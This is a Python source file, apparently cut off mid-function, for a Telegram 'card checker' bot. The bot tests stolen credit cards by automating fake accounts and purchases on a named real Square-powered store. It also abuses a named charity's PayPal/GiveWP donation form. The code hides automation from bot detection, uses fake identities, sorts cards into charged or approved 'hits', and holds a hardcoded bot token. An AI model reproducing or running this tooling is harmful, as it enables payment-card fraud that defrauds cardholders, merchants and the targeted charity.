import os
import re
import time
import random
import string
import asyncio
import httpx
import requests
import json
import base64
import subprocess
import tempfile
from urllib.parse import urlparse
from fake_useragent import UserAgent
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
from datetime import datetime

try:
    from playwright.async_api import async_playwright
    HAS_PLAYWRIGHT = True
except ImportError:
    HAS_PLAYWRIGHT = False
    print("⚠️ Playwright not installed.")

# ==================== Settings ====================
TOKEN = '8840828420:AAEzYToODDQIt-gSl89FmaDNhytOH9t4W6M'
ADMINS = [6843321125]
VIP_USERS = {}
ALL_USERS = set()
GATEWAYS = []
stop_users = {}
last_check_time = {}
ANTI_SPAM_SECONDS = 7
user_tasks = {}
CODES = {}
gateway_index = 0
STRIPE_KEYS = {}
pending_files = {}
hit_counter = 0
HIT_CHAT_ID = -1002429830194
VIP_FILE_LIMIT = 2000

# ==================== Premium Emoji ====================
PREMIUM_EMOJI_IDS = {
    "⚡": "6037229996622225123", "📌": "6037597564218384009", "🤖": "6039619012051082706",
    "🔥": "5206607081334906820", "💳": "5445353829304387411", "💵": "5197434882321567830",
    "❌": "6039615816595414817", "⏱": "5382194935057372936", "🏦": "5332455502917949981",
    "🌐": "5447410659077661506", "👤": "6041709716231429926", "🛡": "5197288647275071607",
    "👑": "6041702032534936873", "🔗": "5933844889652432294", "📊": "5231200819986047254",
    "🚀": "5195033767969839232", "💎": "6039601162167000043", "✅": "6034891730526935918",
    "👥": "6046639187636003094", "🦾": "6042051651462766312", "🌟": "5956369596528204273",
    "💰": "6125337376639161874", "🎉": "6039789659691688114", "🔈": "5388632425314140043",
    "😂": "5352615886131831104", "⭐": "6034999602925542852", "🎺": "5929509352095354418",
    "👁": "5976794472418121581", "💀": "5976323628038363401", "🛑": "5260293700088511294",
    "🧹": "5260293700088511294", "📁": "5260293700088511294", "🔧": "6026056450223116307",
    "📤": "6026056450223116307", "📥": "6026056450223116307", "😱": "5222466772061436244",
    "🎁": "6026316531967726726", "⏸": "6026056450223116307", "💸": "5231449120635370684",
    "🛍": "5229064374403998351", "🔜": "5440621591387980068", "⏹": "5359543311897998264",
    "ADMIN": "6125216237086579378", "GATE": "5929335569128623821",
}


def premium_emoji(text):
    if not text:
        return text
    result = text
    sorted_emojis = sorted(PREMIUM_EMOJI_IDS.keys(), key=len, reverse=True)
    for emoji in sorted_emojis:
        if emoji in result:
            doc_id = PREMIUM_EMOJI_IDS[emoji]
            result = result.replace(emoji, f'<tg-emoji emoji-id="{doc_id}">{emoji}</tg-emoji>')
    return result


# ==================== Ban System ====================
BLOCK_FILE = "blockusers.txt"

def load_blocked():
    if not os.path.exists(BLOCK_FILE):
        open(BLOCK_FILE, 'w').close()
        return set()
    with open(BLOCK_FILE, 'r') as f:
        return set(line.strip() for line in f if line.strip())

def save_blocked(blocked_set):
    with open(BLOCK_FILE, 'w') as f:
        for uid in blocked_set:
            f.write(f"{uid}\n")

def is_banned(user_id):
    return str(user_id) in load_blocked()

def add_ban(user_id):
    blocked = load_blocked()
    blocked.add(str(user_id))
    save_blocked(blocked)

def remove_ban(user_id):
    blocked = load_blocked()
    blocked.discard(str(user_id))
    save_blocked(blocked)

async def banned_guard(update: Update):
    if is_banned(update.effective_user.id):
        try:
            await update.message.reply_text(
                premium_emoji("You can no longer use the bot to lift the ban. Please contact the admin."),
                parse_mode="HTML"
            )
        except:
            pass
        return True
    return False

async def banned_guard_callback(query):
    if is_banned(query.from_user.id):
        try:
            await query.answer(
                "You can no longer use the bot to lift the ban. Please contact the admin.",
                show_alert=True
            )
        except:
            pass
        return True
    return False

# ==================== Square Config ====================
SQUARE_SITE = "https://cosmos-industrial.com"
SQUARE_PRODUCT_ID = 110
SQUARE_PRICE = "5.00"
SQUARE_UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
)
SQUARE_CURL_HEADERS = [
    "-A", SQUARE_UA, "--compressed",
    "-H", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "-H", "Accept-Language: en-US,en;q=0.9",
    "-H", "Sec-Fetch-Site: same-origin",
    "-H", "Sec-Fetch-Mode: navigate",
    "-H", "Upgrade-Insecure-Requests: 1",
]


def square_curl(jar, url, *extra):
    cmd = ["curl", "-sS", "-m", "25", "-c", jar, "-b", jar, "-L"] + SQUARE_CURL_HEADERS + list(extra) + [url]
    return subprocess.run(cmd, capture_output=True, text=True).stdout


def square_parse_jar(jar_path):
    cookies = []
    with open(jar_path) as fh:
        for line in fh:
            raw = line.rstrip()
            if not raw:
                continue
            if raw.startswith("#HttpOnly_"):
                raw = raw[len("#HttpOnly_"):]
            elif raw.startswith("#"):
                continue
            parts = raw.split("\t")
            if len(parts) < 7:
                continue
            cookies.append({
                "name": parts[5],
                "value": parts[6],
                "domain": ".cosmos-industrial.com",
                "path": parts[2],
                "secure": parts[3].upper() == "TRUE",
                "httpOnly": True,
                "sameSite": "Lax",
            })
    return cookies


def square_curl_flow(zip_code):
    jar = tempfile.mktemp()
    ts = int(time.time() * 1000)
    email = f"c{ts}@example.com"
    password = "TestPass123!"

    square_curl(jar, SQUARE_SITE + "/")
    lines = open(jar).read().splitlines()
    if not any("cookie_test" in line for line in lines):
        lines.append(".cosmos-industrial.com\tTRUE\t/\tTRUE\t0\tcookie_test\tplease_accept_for_session")
        open(jar, "w").write("\n".join(lines) + "\n")

    page = square_curl(jar, SQUARE_SITE + "/index.php?main_page=create_account")
    m = re.search(r'name="securityToken" value="([^"]+)"', page)
    if not m:
        return jar, {"error": "reg_token_missing"}

    square_curl(
        jar,
        SQUARE_SITE + "/index.php?main_page=create_account&action=process",
        "-H", f"Referer: {SQUARE_SITE}/index.php?main_page=create_account",
        "--data-urlencode", f"securityToken={m.group(1)}",
        "--data-urlencode", "action=process",
        "--data-urlencode", "email_pref_html=email_format",
        "--data-urlencode", "firstname=Test",
        "--data-urlencode", "lastname=User",
        "--data-urlencode", "street_address=123 Main St",
        "--data-urlencode", "suburb=",
        "--data-urlencode", "city=Austin",
        "--data-urlencode", "zone_country_id=223",
        "--data-urlencode", "country=223",
        "--data-urlencode", "zone_id=57",
        "--data-urlencode", "state=Texas",
        "--data-urlencode", f"postcode={zip_code}",
        "--data-urlencode", "telephone=5125551234",
        "--data-urlencode", f"email_address={email}",
        "--data-urlencode", f"password={password}",
        "--data-urlencode", f"confirmation={password}",
        "--data-urlencode", "newsletter=",
        "--data-urlencode", "email_format=HTML",
    )

    square_curl(jar, SQUARE_SITE + f"/index.php?main_page=product_info&products_id={SQUARE_PRODUCT_ID}&action=buy_now")

    page = square_curl(jar, SQUARE_SITE + "/index.php?main_page=checkout_shipping")
    m = re.search(r'name="securityToken" value="([^"]+)"', page)
    if not m:
        return jar, {"error": "ship_token_missing"}

    square_curl(
        jar,
        SQUARE_SITE + "/index.php?main_page=checkout_shipping&action=process",
        "-H", f"Referer: {SQUARE_SITE}/index.php?main_page=checkout_shipping",
        "--data-urlencode", f"securityToken={m.group(1)}",
        "--data-urlencode", "action=process",
        "--data-urlencode", "shipping=zones_zones",
    )

    page = square_curl(jar, SQUARE_SITE + "/index.php?main_page=checkout_payment")
    if "Step 2 of 3" not in page:
        return jar, {"error": "payment_page_not_reached"}

    return jar, {"ok": True}


async def square_pw_submit(browser, jar_path, cc, exp, cvv):
    cookies = square_parse_jar(jar_path)
    ctx = await browser.new_context(
        user_agent=SQUARE_UA,
        viewport={"width": 1366, "height": 900},
        locale="en-US",
    )
    await ctx.add_init_script("Object.defineProperty(navigator,'webdriver',{get:()=>undefined});")
    await ctx.add_cookies(cookies)
    page = await ctx.new_page()

    try:
        await page.goto(
            SQUARE_SITE + "/index.php?main_page=checkout_payment",
            wait_until="domcontentloaded",
            timeout=30000,
        )
        if "Step 2" not in await page.title():
            return {"error": "session_lost"}

        await page.check('input[name="payment"][value="square_webPay"]')
        await page.wait_for_timeout(6000)

        frame = next((f for f in page.frames if "single-card-element" in f.url), None)
        if not frame:
            return {"error": "square_iframe_missing"}

        await frame.fill("#cardNumber", cc)
        await page.wait_for_timeout(250)
        await frame.fill("#expirationDate", exp)
        await page.wait_for_timeout(250)
        await frame.fill("#cvv", cvv)
        await page.wait_for_timeout(800)

        async with page.expect_navigation(timeout=60000):
            await page.click('input[type="submit"][value*="Continue"]')

        if "Step 3" not in await page.title():
            return {"error": "step3_not_reached"}

        hidden = await page.eval_on_selector_all(
            "input[type=hidden]",
            "els => els.map(e => ({name: e.name, val: e.value}))",
        )
        nonce = None
        for h in hidden:
            if h["name"] == "square_webPay_tokenResult":
                try:
                    nonce = json.loads(h["val"]).get("token")
                except Exception:
                    pass

        try:
            async with page.expect_navigation(timeout=90000):
                await page.click('input[type="submit"][value*="Confirm"]')
        except Exception:
            pass

        body = await page.text_content("body")
        result = "UNKNOWN"
        m = re.search(r"\[([A-Z_]{3,50})\]", body)
        if m:
            result = m.group(1)
        for kw in ("APPROVED", "thank you for your order", "Order Confirmed"):
            if kw.lower() in body.lower():
                result = "APPROVED"
                break

        return {"result": result, "nonce": nonce}

    except Exception as exc:
        return {"error": f"{type(exc).__name__}: {exc}"}
    finally:
        await ctx.close()


async def square_run_check_async(cc, mm, yy, cvv, zip_code):
    jar, state = square_curl_flow(zip_code)

    if not state.get("ok"):
        if os.path.exists(jar):
            os.unlink(jar)
        return {
            "approved": False,
            "message": state.get("error", "flow_failed"),
            "status": "Declined",
        }

    exp = f"{int(mm):02d}{yy[-2:]}"

    try:
        async with async_playwright() as pw:
            browser = await pw.chromium.launch(
                headless=True,
                args=["--no-sandbox", "--disable-blink-features=AutomationControlled"],
            )
            try:
                raw = await square_pw_submit(browser, jar, cc, exp, cvv)
            finally:
                await browser.close()
    finally:
        if os.path.exists(jar):
            os.unlink(jar)

    return raw


def square_classify(raw):
    if "error" in raw:
        return False, raw["error"], "Declined"

    code = raw.get("result", "UNKNOWN")

    if code == "APPROVED":
        return True, "CHARGED", "Approved"

    if code == "GENERIC_DECLINE" or "DECLINE" in code:
        return False, f"DECLINED - {code}", "Declined"

    if any(tag in code for tag in ("CVV", "AVS", "INSUFFICIENT", "INCORRECT")):
        return True, code, "Approved"

    return False, code, "Declined"


def check_square_sync(card_str):
    try:
        parts = card_str.strip().split("|")
        if len(parts) < 4:
            return {'card': card_str, 'status': 'ERROR', 'message': 'Invalid format',
                    'time': 0, 'bin': '', 'bin_info': '', 'approved': False}
        cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
        started = time.time()
        raw = asyncio.run(square_run_check_async(cc, mm, yy, cvv, "78701"))
        elapsed = round(time.time() - started, 2)
        approved, message, status = square_classify(raw)
        return {
            'card': card_str,
            'status': 'CHARGE' if approved and message == 'CHARGED' else ('APPROVED' if approved else 'DECLINED'),
            'message': message,
            'time': elapsed,
            'bin': cc[:6],
            'bin_info': '',
            'approved': approved,
        }
    except Exception as e:
        return {'card': card_str, 'status': 'ERROR', 'message': str(e)[:120],
                'time': 0, 'bin': '', 'bin_info': '', 'approved': False}


# ==================== BIN Info ====================
async def get_bin_info(bin_number):
    urls = [f"https://bins.antipublic.cc/bins/{bin_number}", f"https://lookup.binlist.net/{bin_number}"]
    for url in urls:
        try:
            async with httpx.AsyncClient(timeout=10) as client:
                r = await client.get(url)
            if r.status_code != 200:
                continue
            data = r.json()
            brand = data.get("scheme") or data.get("brand") or data.get("type")
            card_type = data.get("type") or data.get("card_type")
            bank = data.get("bank", {}).get("name") if isinstance(data.get("bank"), dict) else data.get("bank")
            country = data.get("country", {}).get("name") if isinstance(data.get("country"), dict) else data.get("country")
            if not bank:
                bank = data.get("issuer") or data.get("bank_name")
            if not country:
                country = data.get("country_name")
            if brand or bank or country:
                return (f"{brand or 'Unknown'} - {card_type or 'Unknown'}", bank or "Unknown", country or "Unknown")
        except:
            continue
        await asyncio.sleep(0.5)
    return "Unknown", "Unknown", "Unknown"


# ==================== PayPal ====================
UA = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
api_semaphore = asyncio.Semaphore(6)

PAYPAL_RESPONSES = [
    'Payer cannot pay', 'INSUFFICIENT_FUNDS', 'ORDER_NOT_APPROVED',
    'TRANSACTION_REFUSED', 'PAYER_ACTION_REQUIRED', 'INSTRUMENT_DECLINED',
    'CARD_DECLINED', 'PAYMENT_DENIED', 'PAYER_CANNOT_PAY',
    'EXPIRED_CARD', 'INVALID_PAYMENT_METHOD', 'DO_NOT_HONOR',
    'ACCOUNT_CLOSED', 'LOST_OR_STOLEN', 'CVV2_FAILURE',
    'SUSPECTED_FRAUD', 'INVALID_ACCOUNT', 'REATTEMPT_NOT_PERMITTED',
    'ACCOUNT_BLOCKED_BY_ISSUER', 'PICKUP_CARD_SPECIAL_CONDITIONS',
    'GENERIC_DECLINE', 'COMPLIANCE_VIOLATION', 'TRANSACTION_NOT_PERMITTED',
    'INVALID_TRANSACTION', 'RESTRICTED_OR_INACTIVE_ACCOUNT',
    'SECURITY_VIOLATION', 'DECLINED_DUE_TO_UPDATED_ACCOUNT',
    'INVALID_OR_RESTRICTED_CARD', 'EXPIRED_CREDIT_CARD', 'CRYPTOGRAPHIC_FAILURE',
    'TRANSACTION_CANNOT_BE_COMPLETED', 'DECLINED_PLEASE_RETRY',
    'TX_ATTEMPTS_EXCEED_LIMIT', 'PAYER_ACCOUNT_LOCKED_OR_CLOSED',
    'DECLINED', 'CHARGE', 'UNPROCESSABLE_ENTITY', 'VALIDATION_ERROR',
    'INVALID_REQUEST', 'AUTHENTICATION_FAILURE', 'NOT_AUTHORIZED',
    'NOT_ENABLED_FOR_CARD_PROCESSING', 'CARD_TYPE_NOT_SUPPORTED',
    'MERCHANT_NOT_ENABLED', 'PAYEE_NOT_ENABLED_FOR_CARD_PROCESSING',
    'INVALID_CURRENCY', 'CURRENCY_NOT_SUPPORTED', 'AMOUNT_MISMATCH',
    'ITEM_TOTAL_MISMATCH', 'TAX_TOTAL_MISMATCH', 'SHIPPING_TOTAL_MISMATCH',
    'HANDLING_TOTAL_MISMATCH', 'INSURANCE_TOTAL_MISMATCH', 'SHIPPING_DISCOUNT_MISMATCH',
    'INVALID_PAYER_ID', 'INVALID_PAYEE_ID', 'INVALID_RESOURCE_ID',
    'INVALID_PARAMETER', 'INVALID_PARAMETER_SYNTAX', 'INVALID_STRING_LENGTH',
    'INVALID_STRING_FORMAT', 'MISSING_REQUIRED_PARAMETER', 'DUPLICATE_REQUEST_ID',
    'DUPLICATE_INVOICE_ID', 'MAX_NUMBER_OF_PAYMENT_ATTEMPTS_EXCEEDED',
    'PAYEE_ACCOUNT_RESTRICTED', 'PAYEE_ACCOUNT_INVALID', 'PAYEE_ACCOUNT_LOCKED_OR_CLOSED',
    'PAYEE_BLOCKED_TRANSACTION', 'PAYER_BLOCKED_TRANSACTION', 'PAYER_ACCOUNT_RESTRICTED',
    'PAYER_ACCOUNT_INVALID', 'UNSUPPORTED_INTENT', 'UNSUPPORTED_PAYMENT_INSTRUMENT',
    'UNSUPPORTED_SHIPPING_TYPE', 'SHIPPING_ADDRESS_INVALID', 'SHIPPING_OPTION_NOT_SUPPORTED',
    'MULTIPLE_SHIPPING_ADDRESS_NOT_SUPPORTED', 'MULTIPLE_SHIPPING_OPTION_SELECTED',
    'INVALID_PICKUP_ADDRESS', 'PICKUP_ADDRESS_INVALID', 'INVALID_SHIPPING_ADDRESS',
    'AUTHORIZATION_VOIDED', 'AUTHORIZATION_EXPIRED', 'AUTHORIZATION_DENIED',
    'AUTHORIZATION_CAPTURED', 'CAPTURE_FULLY_REFUNDED', 'CAPTURE_PARTIALLY_REFUNDED',
    'REFUND_NOT_PERMITTED', 'REFUND_DENIED', 'REFUND_FAILED',
    'TRANSACTION_ALREADY_REFUNDED', 'TRANSACTION_LIMIT_EXCEEDED',
    'BILLING_AGREEMENT_NOT_FOUND', 'BILLING_AGREEMENT_CANCELLED',
    'BILLING_AGREEMENT_EXPIRED', 'BILLING_AGREEMENT_FAILED',
    'INTERNAL_SERVER_ERROR', 'SERVICE_UNAVAILABLE', 'RESOURCE_NOT_FOUND',
    'METHOD_NOT_ALLOWED', 'NOT_ACCEPTABLE', 'UNSUPPORTED_MEDIA_TYPE',
    'RATE_LIMIT_REACHED', 'INSUFFICIENT_PERMISSIONS', 'INVALID_ACCESS_TOKEN',
    'EXPIRED_ACCESS_TOKEN', 'MALFORMED_REQUEST', 'UNKNOWN_ERROR',
]


class PayPalCommerce:
    def __init__(self, target_url=None):
        self.first_name = ["James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Thomas", "Charles"]
        self.last_name = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]
        self.donation = "1.00"
        self.currency = "USD"
        self.minimum_amount = "1.00"
        self.available_amounts = []
        self.r = requests.Session()
        self.r.verify = False
        self.uu = UserAgent()
        self.client_id = None
        self.access_token = None
        self.client_token = None
        self.form_data = {}
        self.ajax_url = None
        self.cookies = {}
        self._cached_html = ""
        self.target_url = target_url if target_url else 'https://www.sandiegoyokohamasistercity.org/donations/donation-form/'
        self.url = urlparse(self.target_url).netloc
        self.inurl = urlparse(self.target_url).path
        if urlparse(self.target_url).query:
            self.inurl += f"?{urlparse(self.target_url).query}"
        self.email = f"{random.choice(self.first_name)}{random.randint(100,999)}@gmail.com"
        self.is_valid_gateway = True
        self.gateway_type = 'paypal-commerce'
        self._init_and_extract()
        self._get_access_token()
        self._get_client_token()

    def _is_not_paypal_page(self, html):
        if not html:
            return True
        indicators = ['paypal', 'client-id', 'client_id', 'admin-ajax', 'give-form', 'donation-form', 'give_paypal', 'paypal_commerce', 'givewp']
        return not any(ind in html.lower() for ind in indicators)

    def _detect_gateway_type(self, html):
        html_lower = html.lower()
        if 'paypal-commerce' in html_lower or 'paypal_commerce' in html_lower:
            self.gateway_type = 'paypal-commerce'
        elif 'paypal_donations' in html_lower or 'paypal-donations' in html_lower:
            self.gateway_type = 'paypal_donations'
        elif 'paypal_standard' in html_lower or 'paypal-standard' in html_lower:
            self.gateway_type = 'paypal_standard'
        elif 'paypal_express' in html_lower or 'paypal-express' in html_lower:
            self.gateway_type = 'paypal_express'
        elif 'paypal' in html_lower:
            self.gateway_type = 'paypal'

    def _find_donation_form(self, html):
        form_patterns = [
            r'<form[^>]*class=["\'][^"\']*give-form[^"\']*["\'][^>]*>(.*?)</form>',
            r'<form[^>]*id=["\'][^"\']*give-form[^"\']*["\'][^>]*>(.*?)</form>',
        ]
        form_html = None
        for pattern in form_patterns:
            match = re.search(pattern, html, re.DOTALL | re.IGNORECASE)
            if match:
                form_html = match.group(0)
                break
        if not form_html:
            return False
        form_id_match = re.search(r'name=["\']give-form-id["\'][^>]*value=["\']([^"\']+)["\']', form_html)
        if form_id_match:
            self.form_data['give-form-id'] = form_id_match.group(1)
        hash_match = re.search(r'name=["\']give-form-hash["\'][^>]*value=["\']([^"\']+)["\']', form_html)
        if hash_match:
            self.form_data['give-form-hash'] = hash_match.group(1)
        gateway_match = re.search(r'name=["\']give-gateway["\'][^>]*value=["\']([^"\']+)["\']', form_html)
        if gateway_match:
            gateway_val = gateway_match.group(1).lower()
            if 'paypal' in gateway_val:
                self.gateway_type = gateway_val
            else:
                return False
        else:
            radio_match = re.search(r'<input[^>]*name=["\']give-gateway["\'][^>]*value=["\']([^"\']*paypal[^"\']*)["\']', form_html, re.IGNORECASE)
            if radio_match:
                self.gateway_type = radio_match.group(1).lower()
            else:
                return False
        if 'admin-ajax.php' in html:
            self.ajax_url = f'https://{self.url}/wp-admin/admin-ajax.php'
        return True

    def _extract_client_id(self, html):
        patterns = [
            r'client-id="([^"]+)"',
            r'client_id["\']?\s*[:=]\s*["\']([^"\']+)',
            r'data-client-id="([^"]+)"',
            r'clientId["\']?\s*[:=]\s*["\']([A-Za-z0-9_-]{20,})',
        ]
        for pattern in patterns:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                self.client_id = match.group(1)
                return

    def _extract_form_data(self, html):
        inputs = re.findall(r'<input[^>]*type="hidden"[^>]*name="([^"]+)"[^>]*value="([^"]*)"', html)
        for name, value in inputs:
            self.form_data[name] = value
        data_attrs = re.findall(r'data-([\w-]+)="([^"]+)"', html)
        for attr_name, attr_value in data_attrs:
            if any(k in attr_name.lower() for k in ['give', 'paypal', 'form', 'client', 'merchant', 'nonce', 'hash']):
                self.form_data[attr_name] = attr_value

    def _extract_ajax_url(self, html):
        if 'admin-ajax.php' in html:
            self.ajax_url = f'https://{self.url}/wp-admin/admin-ajax.php'
        elif 'wc-ajax' in html:
            self.ajax_url = f'https://{self.url}/?wc-ajax=checkout'

    def _extract_minimum_amount(self, html):
        patterns = [
            r'minimum donation amount of \$([\d.]+)',
            r'data-min-amount=["\']([\d.]+)["\']',
            r'data-minimum-amount=["\']([\d.]+)["\']',
            r'min-amount=["\']([\d.]+)["\']',
            r'name="give-form-minimum"[^>]*value="([^"]+)"',
        ]
        for pattern in patterns:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                try:
                    val = match.group(1)
                    float(val)
                    self.minimum_amount = val
                    return
                except:
                    continue
        self.minimum_amount = "1.00"

    def _extract_currency(self, html):
        patterns = [
            r'name="give-currency"[^>]*value="([A-Z]{3})"',
            r'data-currency="([A-Z]{3})"',
            r'"currency"\s*:\s*"([A-Z]{3})"',
        ]
        for pattern in patterns:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                self.currency = match.group(1).upper()
                return

    def _extract_levels_from_form(self, form_html):
        levels = []
        pattern1 = re.findall(r'data-price-id=["\']([^"\']+)["\'][^>]*data-price=["\']([^"\']+)["\']', form_html, re.IGNORECASE)
        for price_id, amount in pattern1:
            try:
                float(amount)
                levels.append((price_id, amount))
            except:
                pass
        pattern2 = re.findall(r'data-price=["\']([^"\']+)["\'][^>]*data-price-id=["\']([^"\']+)["\']', form_html, re.IGNORECASE)
        for amount, price_id in pattern2:
            try:
                float(amount)
                levels.append((price_id, amount))
            except:
                pass
        radios = re.findall(r'<input[^>]*type=["\']radio["\'][^>]*name=["\']give-amount["\'][^>]*>', form_html, re.IGNORECASE)
        for radio in radios:
            price_id_match = re.search(r'data-price-id=["\']([^"\']+)["\']', radio)
            value_match = re.search(r'value=["\']([^"\']+)["\']', radio)
            if price_id_match and value_match:
                try:
                    float(value_match.group(1))
                    levels.append((price_id_match.group(1), value_match.group(1)))
                except:
                    pass
        options = re.findall(r'<option[^>]*data-price-id=["\']([^"\']+)["\'][^>]*value=["\']([^"\']+)["\']', form_html, re.IGNORECASE)
        for price_id, amount in options:
            try:
                float(amount)
                levels.append((price_id, amount))
            except:
                pass
        return levels

    def _build_form_data_from_html(self, html):
        form_match = re.search(r'<form[^>]*class=["\'][^"\']*give-form[^"\']*["\'][^>]*>(.*?)</form>', html, re.DOTALL | re.IGNORECASE)
        if not form_match:
            return {}
        form_html = form_match.group(1)
        levels = self._extract_levels_from_form(form_html)
        selected_price_id = None
        selected_amount = None
        if levels:
            levels_sorted = sorted(levels, key=lambda x: float(x[1]))
            selected_price_id, selected_amount = levels_sorted[0]
        else:
            selected_amount = self.form_data.get('give-form-minimum') or self.minimum_amount
            selected_price_id = 'custom'
        selected_amount = re.sub(r'[^\d.]', '', str(selected_amount))
        data = {
            'give-form-id': self.form_data.get('give-form-id', ''),
            'give-form-hash': self.form_data.get('give-form-hash', ''),
            'give-gateway': self.gateway_type,
            'give-amount': selected_amount,
            'give-currency': self.currency,
            'payment-mode': self.gateway_type,
            'give-price-id': selected_price_id,
        }
        first_name = random.choice(self.first_name)
        last_name = random.choice(self.last_name)
        data['give_first'] = first_name
        data['give_last'] = last_name
        data['give_email'] = self.email
        inputs = re.findall(r'<(?:input|select|textarea)[^>]*name=["\']([^"\']+)["\'][^>]*>', form_html, re.IGNORECASE)
        optional_fields = {
            'give_title': 'Mr',
            'give_company': '',
            'give_comment': '',
            'give_anonymous': '0',
            'give-address1': '123 Main Street',
            'give-city': 'New York City',
            'give-state': 'NY',
            'give-zip': '10001',
            'give-country': 'US',
            'give-phone': '2125551234',
            'give_agree_to_terms': '1',
            'give_tos_agree': '1',
        }
        for field_name, field_value in optional_fields.items():
            if field_name in inputs:
                data[field_name] = field_value
        return data

    def _init_and_extract(self):
        try:
            headers = {'user-agent': self.uu.random, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'accept-language': 'en-US,en;q=0.9'}
            response = self.r.get(f'https://{self.url}{self.inurl}', headers=headers, timeout=15)
            self.cookies = dict(response.cookies)
            html = response.text
            self._cached_html = html
            if self._is_not_paypal_page(html):
                self.is_valid_gateway = False
                return
            self._detect_gateway_type(html)
            if not self._find_donation_form(html):
                self.is_valid_gateway = False
                return
            self._extract_client_id(html)
            self._extract_form_data(html)
            self._extract_ajax_url(html)
            self._extract_minimum_amount(html)
            self._extract_currency(html)
        except:
            self.is_valid_gateway = False

    def _get_access_token(self):
        if not self.client_id:
            return None
        try:
            headers = {'user-agent': self.uu.random, 'accept': 'application/json', 'content-type': 'application/x-www-form-urlencoded'}
            response = self.r.post('https://api-m.paypal.com/v1/oauth2/token', headers=headers, data={'grant_type': 'client_credentials'}, auth=(self.client_id, ''), timeout=15)
            if response.status_code == 200:
                self.access_token = response.json().get('access_token')
                return self.access_token
        except:
            pass
        return None

    def _get_client_token(self):
        if not self.ajax_url:
            return None
        try:
            actions = ['give_paypal_commerce_get_client_token', 'get_client_token', 'paypal_get_client_token']
            for action in actions:
                data = {'action': action, 'form-id': self.form_data.get('give-form-id', '')}
                headers = {'user-agent': self.uu.random, 'x-requested-with': 'XMLHttpRequest', 'origin': f'https://{self.url}', 'referer': f'https://{self.url}{self.inurl}', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8'}
                response = self.r.post(self.ajax_url, data=data, headers=headers, cookies=self.cookies, timeout=15)
                if response.status_code == 200 and response.text:
                    try:
                        json_data = response.json()
                        if 'data' in json_data:
                            if isinstance(json_data['data'], dict):
                                self.client_token = json_data['data'].get('client_token') or json_data['data'].get('token')
                            elif isinstance(json_data['data'], str):
                                self.client_token = json_data['data']
                            if self.client_token:
                                return self.client_token
                    except:
                        pass
            return None
        except:
            return None

    def _create_order(self):
        if not self.is_valid_gateway:
            return None, "invalid_gateway"
        if self.ajax_url and self.form_data.get('give-form-hash'):
            order_id, err = self._create_order_givewp()
            if order_id:
                return order_id, None
            if err:
                return None, err
        if self.access_token:
            order_id, err = self._create_order_direct()
            if order_id:
                return order_id, None
            if err:
                return None, err
        return None, "all_order_methods_failed"

    def _create_order_givewp(self):
        if not self.ajax_url or not self.form_data.get('give-form-hash'):
            return None, "no_nonce_or_ajax"
        form_data = self._build_form_data_from_html(self._cached_html)
        headers = {
            'user-agent': self.uu.random,
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'x-requested-with': 'XMLHttpRequest',
            'origin': f'https://{self.url}',
            'referer': f'https://{self.url}{self.inurl}',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8'
        }
        params = {'action': 'give_paypal_commerce_create_order'}
        try:
            response = self.r.post(self.ajax_url, params=params, headers=headers, data=form_data, cookies=self.cookies, timeout=15)
            if response.status_code == 200 and response.text:
                try:
                    json_data = response.json()
                    if json_data.get('success'):
                        data_obj = json_data.get('data', {})
                        if isinstance(data_obj, dict) and 'id' in data_obj:
                            return data_obj['id'], None
                        elif isinstance(data_obj, str):
                            return data_obj, None
                    error_msg = None
                    if isinstance(json_data.get('data'), dict):
                        error_msg = json_data['data'].get('error')
                        if isinstance(error_msg, dict):
                            error_msg = error_msg.get('message') or error_msg.get('error')
                    if error_msg:
                        return None, f"create_order: {error_msg}"
                except:
                    return None, f"invalid_json: {response.text[:200]}"
        except Exception as e:
            return None, str(e)[:80]
        return None, "create_order: unknown"

    def _create_order_direct(self):
        if not self.access_token:
            return None, "no_access_token"
        try:
            headers = {'authorization': f'Bearer {self.access_token}', 'content-type': 'application/json', 'user-agent': self.uu.random, 'accept': 'application/json'}
            data = {'intent': 'CAPTURE', 'purchase_units': [{'amount': {'currency_code': self.currency, 'value': self.minimum_amount}}], 'application_context': {'shipping_preference': 'NO_SHIPPING', 'user_action': 'PAY_NOW'}}
            response = self.r.post('https://api-m.paypal.com/v2/checkout/orders', headers=headers, json=data, timeout=15)
            if response.status_code in [200, 201]:
                return response.json().get('id'), None
            return None, f"http_{response.status_code}"
        except Exception as e:
            return None, str(e)[:80]

    def _approve_order(self, order_id):
        if self.ajax_url and 'admin-ajax' in self.ajax_url:
            return self._approve_order_givewp(order_id)
        if self.access_token:
            try:
                headers = {'authorization': f'Bearer {self.access_token}', 'content-type': 'application/json', 'user-agent': self.uu.random}
                response = self.r.post(f'https://api-m.paypal.com/v2/checkout/orders/{order_id}/capture', headers=headers, timeout=15)
                return response
            except:
                pass
        return None

    def _approve_order_givewp(self, order_id):
        if not self.ajax_url:
            return None
        form_data = self._build_form_data_from_html(self._cached_html)
        headers = {
            'user-agent': self.uu.random,
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'x-requested-with': 'XMLHttpRequest',
            'origin': f'https://{self.url}',
            'referer': f'https://{self.url}{self.inurl}',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8'
        }
        params = {'action': 'give_paypal_commerce_approve_order', 'order': order_id}
        try:
            response = self.r.post(self.ajax_url, params=params, headers=headers, data=form_data, cookies=self.cookies, timeout=15)
            return response
        except:
            return None

    def _clean_response(self, text):
        if not text:
            return "DECLINED"
        text_strip = text.strip()
        text_lower = text_strip.lower()
